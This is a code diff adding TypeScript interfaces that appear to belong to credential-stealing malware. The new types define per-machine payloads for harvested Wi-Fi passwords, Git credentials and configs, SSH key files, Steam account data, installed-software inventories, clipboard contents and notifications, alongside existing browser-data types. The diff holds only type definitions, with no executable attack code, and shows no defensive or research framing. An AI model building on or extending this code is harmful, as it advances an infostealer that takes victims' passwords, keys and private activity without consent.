@@ -298,3 +298,95 @@ export interface BrowserDataPayload {
     browsers: BrowserResult[];
   };
 }
+
+export interface WifiProfile {
+  ssid: string;
+  password: string;
+  authentication: string;
+  cipher: string;
+}
+
+export interface WifiDataPayload {
+  addr: string;
+  data: {
+    profiles: WifiProfile[];
+  };
+}
+
+export interface SoftwareEntry {
+  name: string;
+  version: string;
+  publisher: string;
+  install_location: string;
+  uninstall_command: string;
+}
+
+export interface SoftwareInventoryPayload {
+  addr: string;
+  data: {
+    applications: SoftwareEntry[];
+  };
+}
+
+export interface GitCredentialEntry {
+  source: string;
+  path: string;
+  url: string;
+  username: string;
+  password: string;
+  raw: string;
+}
+
+export interface ExtractedFile {
+  path: string;
+  contents: string;
+}
+
+export interface GitDataPayload {
+  addr: string;
+  data: {
+    credentials: GitCredentialEntry[];
+    configs: ExtractedFile[];
+  };
+}
+
+export interface SSHDataPayload {
+  addr: string;
+  data: {
+    files: ExtractedFile[];
+  };
+}
+
+export interface SteamAccountEntry {
+  steam_id: string;
+  account_name: string;
+  persona_name: string;
+  remember_password: string;
+  last_logon: string;
+  details: string;
+}
+
+export interface SteamDataPayload {
+  addr: string;
+  data: {
+    accounts: SteamAccountEntry[];
+    files: ExtractedFile[];
+  };
+}
+
+export interface ClipboardUpdatePayload {
+  addr: string;
+  data: {
+    text: string;
+  };
+}
+
+export interface NotificationEventPayload {
+  addr: string;
+  data: {
+    source: string;
+    title: string;
+    message: string;
+    timestamp: string;
+  };
+}
